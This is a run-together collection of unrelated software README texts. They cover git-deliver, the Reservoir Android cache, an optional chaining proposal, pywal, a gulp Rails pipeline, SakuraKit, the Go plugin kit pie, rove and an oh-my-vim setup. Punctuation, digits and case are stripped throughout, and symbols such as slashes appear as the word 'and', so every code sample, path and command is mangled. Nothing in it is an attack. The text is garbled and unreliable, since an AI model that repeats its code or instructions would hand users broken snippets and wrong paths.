scripts with a name ending in remote sh will be executed entirely on the remote stage scripts can read a few environment variables to gather information about the delivery process all stages have access to version the ref being delivered as it was specified on the command line versionsha sha of the ref being delivered previousversionsha sha of the previously delivered ref gitdeliverpath path to where git deliver is stored reporoot root of the local git repo deliverydate date and time the delivery was initiated using date and f h m s remoteserver hostname or ip of the server we are delivering to empty if doing a local delivery remotepath path to the bare remote repository we are delivering to remote name of the git remote we are delivering to deliverypath path where the version will be delivered on the remote remotepath and delivered and version deliverydate isrollback boolean true if this delivery is a rollback to a previously installed version delivergitssh ssh command used by git deliver to talk to the remote server scripts for stages rollback pre symlink and rollback post symlink have access to laststagereached the last stage the delivery reached before rollback had to be called this allows the rollback stage scripts to know what needs to be undone to perform the rollback empty if delivery stopped before stage pre delivery failedscript name of the stage script that failed triggering the rollback empty if the rollback was caused by an error in the standard git deliver process failedscriptexitstatus exit status of the stage script that failed triggering the rollback  if the rollback was caused by a sigint ctrl and c stage scripts can use the runremote bash function to run commands on the remote through ssh as the ssh user setup for the remote in git runremote also works for local remotes the command will then be run as the user running git deliver note that while you can of course call external programs from your stage scripts you can use bash heredocs to inline other script languages here s an example with ruby and bin and bash ruby eos print hello from ruby and env user and n status roadmap  code contributions are welcome particularly in the form of stage script presets

anything you need to initialize reservoir with the cache size reservoir init this  and and in bytes catch ioexception e and and failure if you want to pass in a custom gson instance for whatever reason you can do that too reservoir init this  mygsoninstance catch ioexception e and and failure the best place to do this initialization would be in your application s oncreate method you can put

these observables are scheduled on a background thread and observed on the main thread by default you can change this easily by assigning your own schedulers and observers to the returned observable first you ll need to add rxjava dependency to your app since reservoir does not come bundled with it compile io reactivex rxandroid rxandroid version tested with v   compile io reactivex rxjava rxjava version tested with v   then you can use the rxjava variants of all the regular reservoir methods and and put a simple object reservoir putusingobservable mykey  myobject returns observable boolean

serialize older objects will be removed in a lru least recently used order no this is a cache you should store stuff in here that is good to have around but you wouldn t mind if they were to be removed sharedpreferences are meant to store user preferences which is not something you want to lose contributions welcome via github pull requests reservoir is just a tiny little convenience wrapper

50607557, this repository represents the sole opinion of its author the author s main goal is that the material presented here could be used as a sound basis for the official ecmascript proposal when looking for a property value deeply in a tree structure one has often to check whether intermediate nodes exist var street user address user address street also many api return either an object or null and undefined and one may want to extract a property from the result only when it is not null var fooinput myform queryselector input name foo var foovalue fooinput fooinput value undefined the optional chaining operator allows to handle many of those cases without repeating yourself and and or assigning intermediate results in temporary variables var street user address street var foovalue myform queryselector input name foo value the following code var setproto if object prototype hasownproperty proto setproto object getownpropertydescriptor object prototype proto set could become shorter var setproto object getownpropertydescriptor object prototype proto set the following code if foo null foo symbol iterator null and and foo is iterable var iterator foo symbol iterator and and could be rewritten as disregarding the buggy case where foo symbol iterator would not produce a function var iterator foo symbol iterator if iterator and and foo is iterable and and the following code var list  node tree   editionparams  foolist and and could become more readable var list node tree editionparams foolist and and the operator is spelt and may be used at the following positions obj prop and and optional property access obj expr and and ditto func args and and optional function or method call new c args and and optional constructor invocation but is that case useful in order to allow foo   to be parsed as foo   as required for backward compatibility  a simple lookahead is added at the level of the lexical grammar so that the sequence of characters is not interpreted as a single token in that situation the token must not be immediately followed by a decimal digit we don t use the obj expr and func arg syntax because of the difficulty for the parser to distinguish those forms from the conditional operator e g obj expr filter fun  and func x  and   alternative syntaxes for those two cases have each their own flaws and deciding which is one the least bad is mostly a question of personal preference here is how we made our choice pick the best syntax for the a b case which is expected to occurs most often  extend the use of the sequence of characters to other cases in order to have a uniform look a b  a b here are other alternatives that don t need lookahead are proposed obj prop and and optional property access obj expr and and ditto func args and and optional function or method call new c args and and optional constructor invocation obj prop and and optional property access obj expr and and ditto func args and and optional function or method call new c args and and optional constructor invocation and minimising the number of characters but the question mark inside the brackets don t look good obj prop and and optional property access obj expr and and ditto func args and and optional function or method call new c args and and optional constructor invocation the explanations here are optimised for the human mind for a more machine friendly version look at the spec text base case if the expression at the left hand side of the operator evaluates to undefined or null its right hand side is not evaluated and the whole expression returns undefined a b and and undefined if a is null and undefined a b otherwise a and and x and and if a evaluates to null and undefined the variable x is not incremented a b c d and and undefined if a is null and undefined a b c d otherwise and and nb if a is not null and undefined and a b is nevertheless undefined and and short circuiting does not apply locality apart from short circuiting the semantics is strictly local for instance the meaning of a token is not modified by a previous token found earlier in the chain a b c d and and if a is not null and undefined and a b is nevertheless undefined         and and short circuiting does not apply the meaning of c is not modified short circuiting semantics may be compared to an early return instruction in a function free grouping as currently specced use of parentheses for mere grouping does not stop short circuiting however that semantics is debatable and may be changed a b c d and and equivalent to a b c d a b    and and trigger an early referenceerror same error as a b c  etc delete a b  and and no op if a is null and undefined technically the semantics are enforced by introducing a special reference called nil which is propagated without further evaluation through left hand side expressions property accesses method calls etc  and which dereferences to undefined the nil reference is a spec artefact that is used because it is more pleasant to write the spec that way but if you intend to transform code using optional chaining into es compatible code it is more useful to have an  abrupt completion mental model concretely the expression a b c d could be rewritten using an iiafe and early return statements let  a if  null return   b c if  null return return  d

75848188, pywal is a python  version of wal written by me it s faster the code is cleaner it actually has tests and it supports more export formats pywal can also be installed easily on any distro by using pip install pywal wal is a script that takes an image or a directory of images  generates a colorscheme using imagemagick and then changes all of your open terminal s colorschemes to the new colors on the fly wal then caches each generated colorscheme so that cycling through wallpapers while changing colorschemes is instantaneous wal finally merges the new colorscheme into the xresources db so that any new terminal emulators you open use the new colorscheme wal can also change the colors in some other programs check out the customization customization section below note wal is not perfect and won t work with some images requirements requirements dependencies dependencies terminal emulator terminal emulator installation installation setup setup applying the theme to new

the command below can be used as a test to see if wal will work with your setup run the command below does the background color of your terminal become red printf b   ff  if your terminal s background color is now red your terminal will work with wal just grab the script wal and add it to your path note if you get junk in your terminal add t to all of the wal commands wal only applies the new colors to the currently open terminals any new terminal windows you open won t be using the new theme unless you add a single line to your shell s start up file bashrc  zshrc etc the r flags tells wal to find the current colorscheme inside the cache and then set it for the new terminal add this line to your shell startup file bashrc  zshrc or etc wal r here s how the extra syntax above works run the process in the background hide shell job control messages on reboot your new colorscheme won t be set or in use to fix this you have to add a line to your xinitrc or whatever file starts programs on your system this wal command will set your wallpaper to the wallpaper that was set last boot and also apply the colorscheme again without this you ll be themeless until you run wal again on boot

updates my lemonbar  dunst and startpage colors with the new ones from wal when run what i ve done is bind both wal and my custom script to the same key so that after wal has done its thing my custom script applies the colors to the rest of my environment bindsym mod and w exec wal i home and pictures and wallpapers o wal set now whenever i press win and w a random wallpaper is chosen and all of the programs on my system start using the new colors immediately i ve also set wal and my custom script to start with x this means that when i boot my pc a random wallpaper is chosen and colors are generated and applied to all of my programs wal i home and pictures and wallpapers o wal set have a look at my script to see how wal is used and how the programs get reloaded with the new colors note wal stores the exported files in home and cache and wal and to use wal with i you have to make some modifications to your i config file i can read colors from xresources into config variables this allows us to change i s colors dynamically on run wal will detect that you re running i and reload your config for you if you ve set it up correctly i will then use your new colorscheme

colorscheme wal polybar can read colors from xresources to set the bar s colors fg xrdb color bg xrdb color there s a script called waliterm in contrib and waliterm which converts the generated colors to an importable iterm colorscheme the themes are stored in the wal cache directory home and cache and wal and itermcolors wal i image o and path and to and waliterm and waliterm wal also exports the colorscheme as a list of shell variables that you can source for use in scripts and the shell source home and cache and wal and colors sh in the shell dylan echo color dylan echo color color lemonbar

import colors import and home and dylan and cache and wal and colors scss background color color color wal also exports the colors as firefox css variables for use with stylish or userchrome css example firefox css and import the css file note this must be at line  of your firefox stylesheet and import url file and and and home and dylan and cache and wal and firefox css and use the variables and background color var color important color var color important wal also exports the colors so they can be used with putty after running wal  a file will be created home and cache and wal and colors reg that can be executed on a windows machine to create a new putty session with the generated colors once the file is executed you can select wal from the saved sessions list wal also exports the colors in a plain text format this is helpful when you want use the plain colors in another script see the script in contrib and waliterm for an example the file is called colors and just contains the hex values one per line in the order of   example colors file example usage in a script c cachedir and colors c c and and you can also manually create your own colors files and load them directly with the wal f option to quickly switch between your favorite colorschemes without changing the background wal f home and colors and monokai wal f home and colors and solarized you can import wal s colors into terminal sexy by copy pasting the contents of the colors xresources file located in the cache directory

component which is then passed to react render routine no callbacks are passed to sub components this becomes especially useful when you find yourself trying to transfer a callback to a component s grand children you may never know how your dom may be restructured after a redesign there is nothing inherently wrong in passing callbacks to sub components but in many cases this can be avoided no

30622672, leaves sprockets and manifest files intact for use with gem installed assets transform and bundle commonjs modules js or coffee with browserify compile sass and scss with libsass node sass through gulp sass autoprefix css optimize images could be expanded to further process or resize images compile an icon font and sass from a folder of svgs full browsersync integration the original rails asset pipeline didn t work with live stylesheet injection revision filenames in production for caching build assets on deploy with heroku clone the repository enter into the directory and run bundle install cd gulp rails pipeline bundle install install javascript dependencies once npm install runs the postinstall setting in package json will run gulp build and do an initial build of your assets npm install start the rails server run gulp and rejoice this will start watching and recompiling files on the fly as well as open a browser with browsersync running try editing global sass and watch how fast it reloads the css once you taste the speed of libsass and browsersync you ll never go back test out changing view code and javascript as well asset file structure file structure png this is where all your source files will live your source icons for icon fonts sass files js modules and images anything that needs to get processed by gulp all assets are set up to compile to public and assets the destination of your compiled and processed assets the application css and application js manifest files in app and assets pull compiled code from this folder the old default asset directory should only include manifest files which are necessary if you need to require gem installed assets e g  jqueryujs turbolinks with sprockets the manifest files pull in gem assets as well as our compiled js and css files from and public and assets config assets paths rails root join public  assets  stylesheets config assets paths rails root join public  assets  javascripts if you plan on continuing to use sprockets to and and require gem assets you ll include your compiled js and css files in the application js and application css manifests files the snippet above tells sprockets to look in our public and assets directories when searching for required files with this implementation you ll continue using the rails javascriptincludetag and stylesheetlinktag asset pipeline helpers to pull in your manifest files and everything they require if you end up not needing the pipeline at all you can pull in your compiled css and js directly with the gulpassetpath helper see below and regular html config assets debug true config assets digest false to fully take advantage of browsersync s live stylesheet injection be sure to configure the two values above setting config assets debug to true tells rails to output each individual file required in your application js and application css manifests rather than concatenating them this is the default setting in development setting config assets digest to false disables appending md hashes for caching with future expires headers with your individual files referenced and their file names unchanged browsersync can reference and replace them properly as they get changed scripts postinstall gulp build dependencies after running npm install  node will search the scripts object in package json for postinstall  and will run the script if specified gulp build compiles your assets the build can be set up differently for different rails environments see below a note about dependencies services like heroku will ignore anything in devdependences  since it s technically a production environment so be sure to put anything your build process needs to run in dependencies  not devdependencies and and line  if process env railsenv production tasks push rev if the railsenv is set to production  assets will be renamed with an appended md hash for caching with far future expires headers and any references in stylesheets or javascript files will be updated accordingly for inline asset references in rails views you can use the following asset helper def gulpassetpath path path revmanifest path if defined revmanifest and assets and path revmanifestpath public and assets and rev manifest json if file exist revmanifestpath revmanifest json parse file read revmanifestpath you ll notice this constant referenced in the gulpassetpath helper above the gulp and tasks and rev js that gets run in production outputs a rev manifest json file mapping the original filenames to the revisioned ones if that file exists when the app starts the hashed filenames are used if it doesn t exist the filename references remain unchanged to avoid git messiness and redundant rebases and merge conflicts it s usually a good idea to gitignore your compiled assets this means you ll have to have them compile as part of your deploy process in short you ll need to ensure the following  node is installed  npm install runs  gulp build runs on postinstall specified in package json these steps must complete before starting the rails server heroku makes deploying super easy but there are a couple of things you ll need to do to get this running heroku buildpacks view current buildpacks heroku buildpacks clear clear current buildpacks if necessary heroku buildpacks add heroku and nodejs add the buildpacks we want heroku buildpacks add heroku and ruby in the order we want them now when we deploy to heroku first npm install will run then our postinstall script specified in package json  and then bundle install will run take note of the following production rb line  config servestaticfiles env railsservestaticfiles present heroku requires config servestaticfiles to be enabled so be sure to either add railsservestaticfiles as a config var in your heroku settings or manually set this to true in your production rb file all we need to do is add a task to run npm install before we compile the assets before deploy assets precompile  deploy npminstall namespace deploy do desc run npm install task npminstall do invokecommand bash c and home and deploy and nvm and nvm sh cd releasepath npm install
99071507, sakurakit  is a lightweight and powerful library for application to switching themes or skins inspired by swifttheme and dknightversion its provides chain and functional programming that is more readable for your codes for demo take a look at the sakurademooc an ios example project in the workspace you will need to run pod install after downloading sakura mean theme as following now sakura for your apps there are three ways to use sakurakit in your project using cocoapods manual using carthage cocoapods is a dependency manager for objective c which automates and simplifies the process of using rd party libraries in your projects podfile platform ios   pod sakurakit download repo s zip and just drag all files in the sakurakit folder to your projects brew update brew install carthage to integrate sakurakit into your xcode project using carthage specify it in your cartfile github tingxins and sakurakit run carthage to build the frameworks and drag the sakurakit framework framework into your xcode project here s an example configure skins for uibutton as an example following uibutton button uibutton alloc initwithframe cgrectmake     button sakura backgroundcolor home buttonbackgroundcolor titlecolor home buttontitlecolor  uicontrolstatenormal obviously as the code show it s just configure backgroundcolor titlecolor of skin for a button if you want to switch theme or skin for your apps just call this api use txsakuramanager and and name name of a theme or skin and and type txsakuratypemainbundle or txsakuratypesandbox and bool shiftsakurawithname txsakuraname name type txsakuratype type for lines of code above you may be puzzled by some literals such as home buttonbackgroundcolor or home buttontitlecolor do not worry about we will focus on how to set up a profile for sakura step by step later now let s focus on profile in brief profile is a simple way to manage theme or skin for your application setting in a project actually sakura profile is just likes localizing your app sakurakit supports both json plist format of file for json file example you may should do configure like this home buttonbackgroundcolor bbd  buttontitlecolor afa  as show above we can know that literals of home buttonbackgroundcolor and home buttontitlecolor is just a keypath for dictionary sakurakit always fetch value from profile switching theme or skin for your app such as color and iconname and text and fontsize e g precautions  each theme has its own profile including mainbundle and sandbox themes mainbundle default theme named default  and its profile named default json  the theme name is the same as the name of profile for example if a theme called fish  then the corresponding profile should be named fish json recommended to comply with this agreement  different mainbundle theme local theme need be distinguish for icon name for different sandbox theme remote theme  icon name should be the same bundle themes are exists in your app bundle we also called local theme we should always configure a default theme for app of course sakurakit can add multi bundle themes for your app following these steps first create sakuraname json profile be sure that the sakuraname is your theme name for example if you want to add a new bundle theme which named typewriter  then the corresponding profile should be named typewriter json next configure icons for typewriter theme and name of icons need be distinguish with other local theme for example if an icon named cmbtmicnaccount in default theme then the corresponding icon in typewriter theme should be named like this cmbtmicnaccountxxx after step   you may should register all local sakura theme in appdelegate default theme can be ignored bool application uiapplication application didfinishlaunchingwithoptions nsdictionary launchoptions and and coding txsakuramanager registerlocalsakurawithnames typewriter and and coding return yes at this point we have configured all bundle themes we can switching to these themes any time now for example if you want switching to a specified bundle theme which named typewriter just call api like this txsakuramanager shiftsakurawithname typewriter type txsakuratypemainbundle sandbox themes using compressed package zip with a folder which contains profile icons and we also called remote theme the user can downloads via the network from server server can uploading multi themes dynamic and then user can downloads from app about remote theme data format suggestion give an example fyi name i m a monkey  sakuraname monkey  url http image tingxins cn sakura monkey zip sakuraname is your theme name and url is a remote url address of sakura theme note if the sakuraname field passed nil the name of the corresponding theme will default to the name of downloaded package when the remote theme has been downloaded we can switching the theme like this txsakuramanager shiftsakurawithname sakuraname type txsakuratypesandbox let s talk about it now if you want to download a sakura theme you can call the download task block api like this show the code of use case txsakuramanager manager txsakuradownloadwithinfos sakuramodel

want to making theme only for icons q why is the sakura name should be consistent with the profile name of corresponding theme q what is the difference between bundle and sandbox themes a actually bundle theme we called the local theme remote theme also called sandbox theme q do sakurakit have a version that written in swift absolutely you can contribute to this project all the time if you want

36266374, import github com and natefinch and pie package pie provides a toolkit for creating plugins for go applications why is it called pie because if you pronounce api like a pie  then all this consuming and serving of apis becomes a lot more palatable also pies are the ultimate pluggable interface depending on what s inside you can get dinner dessert a snack or even breakfast plus then i get to say that plugins in go are as easy as well you know if you have to explain it to your boss just say it s an acronym for plug in executables sub but it s not really and sub plugins using this toolkit and the applications managing those plugins communicate via rpc over the plugin application s stdin and stdout functions in this package with the prefix new are intended to be used by the plugin to set up its end of the communication functions in this package with the prefix start are intended to be used by the main application to set up its end of the communication and start a plugin executable this package provides two conceptually different types of plugins based on which side of the communication is the server and which is the client plugins which provide an api server for the main application to call are called providers plugins which consume an api provided by the main application are called consumers the default codec for rpc for this package is go s gob encoding however you may provide your own codec such as json rpc provided by net and rpc and jsonrpc there is no requirement that plugins for applications using this toolkit be written in go as long as the plugin application can consume or provide an rpc api of the correct codec it can interoperate with main applications using this process for example if your main application uses json rpc many languages are capable of producing an executable that can provide a json rpc api for your application to use included in this repo are some simple examples of a master process and a plugin process to see how the library can be used an example of the standard plugin that provides an api the master process consumes is in the examples and provider directory master provider expects plugin provider to be in the same directory or in your path you can just go install both of them and it ll work correctly in addition to a regular plugin that provides an api this package can be used for plugins that consume an api provided by the main process to see an example of this look in the examples and consumer folder func newconsumer rpc client newconsumer returns an rpc client that will consume an api from the host

register publishes in the provider the set of methods of the receiver value that satisfy the following conditions exported method two arguments both of exported type the second argument is a pointer one return value of type error it returns an error if the receiver is not an exported type or has no suitable methods it also logs the error using package log the client accesses each method using a string of the form type method  where type is the receiver s concrete type func s server registername name string rcvr interface error registername is like register but uses the provided name for the

8983878, run rake server to bootstrap sinatra or rake console to have some command line fun we are doing our best to add more useful packages to rove but that s not enough if you are an author of a nice vagrant cookbook  you are very welcome to add its support to make this job easier we wrapped packages and patterns into a tiny dsl described below you can find all the packages located at and packages directory patterns at and patterns and vagrant configuration in vagrantsettings accordingly feel free to add some more and create a shiny pull request packages are atomic parts of the config they are typically either one recipe or a single tool and service be it a programming language like ruby or a database like postgresql each package consists of nested options switches and inputs that will affect resulting vagrant configuration and also the set of cookbooks that will be added to resulting cheffile here is the base of a package rove package foobar do title foobar can be skipped and will be defaulted to foobar tos humanize category something this is the least possible description you need to specify an unique keyword for the package you work on foobar and also a category omitting any of those will result into an exception to make configuration possible rove defines three kinds of possible user inputs options inputs and selects each of them can be nested into any other option is your infantry rove package foobar do category something option importantflag do title set important flag can be skipped and will be defaulted to importantflag tos humanize this option will become available as soon as the parent is enabled option importantsubflag option enableautostart options give you ability to make particular features switchable on the other hand select gives an ability to force user to choose between possible options rove package foobar do category something option enableautostart do select select launcher to use do option launcher do option delivercrashreports do title deliver crash reports end end option launcher as you can see you can freely nest options in any order note however that options have to have unique keywords in the context of package no matter how deeply they nested sometimes you might want to get some custom textual user input it s possible with input method it behaves absolutely identical to option rove package foobar do category something option enableautostart do select select launcher to use do option launcher do option delivercrashreports do title deliver crash reports input deliveremail do title deliver to end end end option launcher additionaly you can specify a default value like this rove package foobar do category something input password do default ololo config do and value and this block runs with any configuration default value is used if input was not enabled manually in case you know list of all possible values you can specify them using enum rove package foobar do category something input logtype do default warning enum info  warning  error config do and value and  now that you described your package s options we can use them to affect the resulting configuration rove defines three methods that will help you to achieve that cookbook  recipe and config they can be called from any option select or input and also from the package itself rove package foobar do category something adds cookbook dependency every given option will be proxied to librarian as is cookbook foobar  option value activates recipe at provisioning recipe foobar option enableautostart do a hash returning from this method will be merged into provisioning configuration note that this is going to happen only while enableautostart option is enabled config do foobar user ololo  select select launcher to use do option launcher do option delivercrashreports do another cookbook that will be required as long as delivercrashreports is enabled cookbook foobaremails title deliver crash reports end end option launcher while cookbook and recipe methods are pretty straightforward the config method has some overloads to handle tough cases rove package foobar do category something typically it can accept up to two arguments config do and config build and config contains current config condition at the moment of block evaluation build details of build that was requested by user complete list of required packages and options while being called from an input it gets up to three parameters input option do config do and value config build and value a textual input that was provided by user config contains current config condition at the moment of block evaluation build details of build that was requested by user complete list of required packages and options sometimes it might be useful to define a helper rove package foobar do category something config do specificconfigurator def specificconfigurator an order of merge between options is not declared they have to be isolated and it plays well in most cases but sometimes it doesn t in these dark times finalizer comes to save you consider it an after filter of a package configuration rove package foobar do category something a b input option do config do b c finalizer do and config and config a b  b c finalizer can only be defined at a package level vagrant settings are also atomic parts of the config follow a similar pattern to packages and support altering the default vagrant configuration they inherit the same user input options as packages along with default values here is an example of a setting taking two input values and being applied to create a line of configuration for vagrant rove vagrantsetting mysetting do provide a block returning a line of config values appear in the order of input specification below config do and firstvalue secondvalue and vagrant config iwanttoset this firstvalue  andthis secondvalue input option do title please set me default foo config do and value and mysetting config option value   input option do title i need to be set too default bar config do and value and mysetting config option value   pattern is a build template it lists pre enabled packages and corresponding internal options for each of them patterns are powered by the configuration objects listed previously as commands such as package or vagrantsetting rove pattern rails do title rails can be skipped and will be defaulted to rails tos humanize first argument is a keyword of package other arguments are options that should be enabled package ruby rbenv  rbenv  rbenv note that sometimes you might require to pass values for inputs here is the alternative syntax for options package ruby ruby true rbenv true somethingtoinput yes i do and some other packages package postgresql package redis package git add vagrant configuration if necessary vagrantsetting portforward guestport  hostport  since rove is a working service  just go and look through packages  patterns or vagrantsettings directories it s full of packages we already use

in current folder preview results and open selected files for mac os you can just run the script and tools and preparemac sh it will install some necessory tools and the latest vim   with lua support for linux there is no script yet you need to figure out what the above script does and install them according apt get etc please note a vim with lua support is required run tools and install sh tools and install sh it will be installed to and oh my vim folder for you please set this font for your terminal for macvim or gvim nothing need to be done for iterm go for profile open profile default edit profile text none ascii font open your vim it will install a bunch of plugins at the first time close the vim and re open it then you are all set you can overwrite the default configuration and key bindings by creating one of following files and before vimrc will be loaded before everything else and local vimrc will be loaded after bundles are initialized and before the settings take place the idea was so people could add bundle lines without having to worry about conflicts in vimrc when pulling and after vimrc will be loaded after all configuration options are set this is the best place to change default behaviour keybindings or color scheme obviously i steal a lot work from others here is my special thanks to joe di castro joedicastro s of this config is copied from joe including large amount of this readme his idea of using unite to create ui is brilliant some scripts most shortcuts start with either  or space leader key is mapped to  localleader key is mapped to space localleader u i e space u will trigger the awesome unite ui oh my vim features are organized as packages while each package is just a vimrc file modulization is good because each package is short and easy to follow you can easily add a new package such as java or ruby and send a pull request you can ignore the package you don t need by setting a parameter g oh my vimpackages in local vimrc the packages list all the packages are viewalbe in the unite ui interface unite is an interface that unifies various query results under a common aspect and that follows vim s default behavior modal it s almost an api that we can use to build our own solutions in fact the author describes it as unite and create interfaces with unite you can open a file change the buffer choose a colorscheme make a regex search grep ack ag  etc even you can take a look at the vim registers messages help command functions in short it is a swiss army knife that well used allows us to replace several different plugins with only one in this case ctrlp ack yankring tagmatasks and tagbar the unite menu will show what functionality we have and what s their key mappings you can always refer the menu for something you don t remember the shortcut the main unite munu in unite you can filter result in insert mode you can select candidates and apply operations to selected candidates in normal mode below are some of the available mappings mappings normal mode q exit from unite and submenus q exit from unite and all submenus i change to insert mode v change to visual mode tab choose an action a choose an action for the selected candidate or add text at the end of the prompt c r reset the menu space mark the current candidate mark all candidates m removes the candidate number limit gg  g  j  k typical vim moves to move around candidates shows help mappings n add a new candidate only where have sense show hidden files dotfiles with a candidate selected cr execute the default action b add it to bookmarks d

unite menu code  shows the code menu these are the menu entries in detail count lines of code count the lines of code of the current file by the external program cloc and shows the output in unite toggle indent lines show and hide the indent lines that works as a visual guide for long nested blocks of code putting vertical lines for each indentation level is disabled by default syntastic toggle  syntastic check errors are two options of syntastic a plugin for code quality syntax revision for various programming and markup languages python ruby lua haskell css html js json via external tools these tools are required show the syntax errors in the signs column gutter also shows the total of errors and the number line of the first in the status line other tools ultisnips is a plugin to manage snippets the most advanced and powerful for this task that i know for vim snippets are portions of code or text in which certain parts are declared as variable and the rest is fixed they are very helpful to insert the same code structures again and again without need to write all the text saving us an important number of keystrokes to use them we only have to type the snippet keyword and the mapping the fixed part of text is inserted automatically then the cursor moves to the first variable field to enter the desired text interactively and so on in the image you can see how it really works ultisnips brings by default a bunch of snippets classified for languages and some globals the best feature of ultisnips is that allows us to define our custom snippets with a level of control and automation than any other one offers to know all the details is essential to read carefully the plugin help btw certain features are remarkable like nested snippets embed external commands shell vimscript and python in the snippets use the snippets over visual selections and text transformations into the snippets mappings tab preceded by the snippet keyword trigger the snippet c j jump to the next field c k jump to the previous field bs cancel the text enter in an optional field this menu groups several options to edit text unite localleader e or unite menu text shows the text menu toggle search results highlight toggle the search results highlight obviously toggle line numbers toggle between the four possible visualizations of the line numbers column none relative two forms  and absolute toggle wrapping toggle automatic wrapping and the vertical column color the vertical column that indicates wrapping threshold turns green when the automatic wrapping is disabled show hidden chars show the hidden chars those that are not printable tabs carriage returns spaces the next three entries are to fold and unfold the folds in our doc one by one or all at the same time and the three after those allows us to copy and paste from system clipboard and for toggle the paste mode remove trailing whitespaces delete those empty and almost never significant spaces at the end of the line text statistics show the number of columns lines words chars and bytes in total and for the current position show word frequency show the number of times that each word appears in the text show available digraphs show a table with all the digraphs available and the pair of chars needed to generate each of them insert lorem ipsum text insert a text block containing the famous lorem ipsum lorem text show current char info show extended info about the current character the info includes the decimal unicode value hexadecimal octal unicode name html entity emoji code and any digraph available other text edition tools apart from the tools included in the menu and apart from the vanilla vim ones too we have another bunch of tools available to help us to edit the text more text objects these are customized text objects that allow us to extend the vim motions defined by default word sentence paragraph block delimiters and markup tags and be able to use more efficient text selections in this config i added the following ones line select a line by al or il underscore select the text surrounded by underscores via a or i all the buffer select the entire buffer we can use ae and ie indent select a indentation level options ai  ii  ai  ii i select the current level and the nested ones i only selects the current indent level last search select the last search term

commentary an extremely easy tool to toggle commentary in lines and visual selections we only need to enter a mapping and a movement to do the action as simple as that mapping leader c or gc toggle the commentary vim surround surround a vim text object with a pair of symmetrical chars we can also remove or change the ones already there mappings ys motion or text object char create surround your surround cs origchar destchar change surround ds char delete surround s char for create surrounds in visual mode if we choose the first member of a pair e g  then the surround is created with a whitespace between the char and the selection if the last is choosen e g  then the extra space is not added vim speeddating provides a smart way to increase and decrease time values mappings c a increase the time value under the cursor c x decrease the time value under the cursor d c a change the time under the cursor to the current utc time d c x change the time under the cursor to the current local time delimitmate provides smart auto completion for delimiters like        this is very easy to use if we write the first pair of these chars then the second one is automatically introduced and the cursor moves to the interior thereof then we continue writing and to exit the inside you only have to write the second character or press s tab if you only want the first char you only have to press the delete key neocomplete auto completion of keywords methods functions etc by only typing a few letters normally the first well used this speeds up a lot writing of code or text it improves the vanilla vim auto completion with a live fuzzy logic search it s powerful and totally customizable mappings cr insert the selected word c n go to the next word below in the option list c p go to the previous word above in the option list easydigraph easily insert digraphs especially when trying to insert several simultaneously mapping leader dd motion turns in digraph the motion selected text vim transpose transpose rows columns for certain kind of files like csv  it can be really helpful to deal with them it works in visual mode commands transpose do the transposition by default transposecsv separator delimiter do the transposition by or by the specified separator delimiter transposetab transpose by tabs transposewords transpose by words inserts a where is no one transposeinteractive for complex transpositions this menu allows us to search files by regular expression engines i have it configured to use the ag program first then ack if ag is not found and else the grep program we can also use other unix tools like locate and find from this menu unite localleader a or unite menu grep shows the grep menu grep ag  ack  grep search files by content using a regular expression pattern in a target directory shows us the results in unite between brackets are the list of programs to use sorted by priority it uses the first available grep current word grep the word under cursor find use the known unix tool find to search files by name locate same as above using the locate tool instead vimgrep as a last resort in case you don t have any regex search tool installed you can use the internal vim grep one but it is extremely low in comparison with another of the mentioned in the first entry so use it only if you are desperate unite localleader f or unite menu searching shows the searching menu line find all the lines where the introduced string appears word under the cursor find all the lines where the word under the cursor appears it is a improved version of the key behavior outlines tags ctags list all the document outlines and allow us to navigate between them very useful to move around the headers of a markdown document like this in code files it shows the source tags ctags to move easily to a given point of the code marks list all the marks folds navigate among folders changes list all the changes made to the file jumps list all the last window jumps undos show the file undo history tasks show all the pending tasks for the current buffer these tasks and notes are defined by the following keywords todo fixme note xxx  combak and  todo other tools vim signature a plugin that improves the default vim marks it shows the marks in the lateral signs column mappings alphabetic marks m a za z toggle the mark and display it in the signs column gutter m place the next available mark m space delete all marks code and code jump the next mark code and code jmmp the previous mark jump to start of next line containing a mark jump to start of previous line containing a mark symbol marks markers m   toggle the corresponding marker m s   remove all markers of the same type jump to next line having same marker jump to prev line having same marker m bs remove all markers unite localleader i or unite menu registers shows the registers menu yanks list all the yanks arranged chronologically starting with the most commands show the ex command history searches list the last searches registers show the vim registers content messages show the messages register like the messages command undo launch the gundo plugin gundo makes the vim undo tree friendlier we can preview the changes and navigate easily around the tree mappings in addition to the options available on the menui i have set a number of mappings that make it much easier to manage windows c h move to the next window to the left c j move to the lower window c k move to the upper window c l move to the next window to the right unite localleader b or unite menu navigation shows the navigation menu the first three menu entries let us to easily move to the chosen buffer tab or window from the candidates location list and quickfix to access these windows content through unite interface resize windows use the winresizer plugin to easily resize the windows mappings h  j  k  l use vim motions to move the windows separator esc end the resizing q cancel the resizing the next two entries are for creating new windows horizontal and vertical and the third one is to close any window except the last toggle quickfix window toggle the quickfix window also close the location list if is opened zoom make zoom in a window delete buffer delete a buffer unite localleader o or unite menu files show the file menu open file show a list of files available in the current working directory open more recently used files show the last opened files open file with recursive search same as above but including the files under the subdirectories recursively the next three entries are similar to the preceding ones but working with directories instead of files make new directory make a new directory without opening a file browser change working directory allow us to change the current working directory know current working directory is like running the pwd command junk files to open a new or a previous one junk file to make annotations tests save as root allow us to save a file that only have permissions for root without need to run vim under that user or use sudo and lost our configuration advantages by doing that quick save save quickly the file without need to run the w command open ranger call the external ncurses file manager ranger rngr to browse the directory hierarchy and choose the file that you want to edit open vimfiler open the file explorer vimfiler unite based and very powerful i used mainly in those computers where ranger is not available it has a safe mode enabled by default in which you cannot copy rename move create or delete files and directories mappings tab open a new vertical window if is already opened toggle between them j  k and gg typical vim motions to move between the files h  l move between the parent and child directories space select and deselect the current line select and deselect all the lines select similar lines u deselect everything s change the sort type by name date size c copy the file

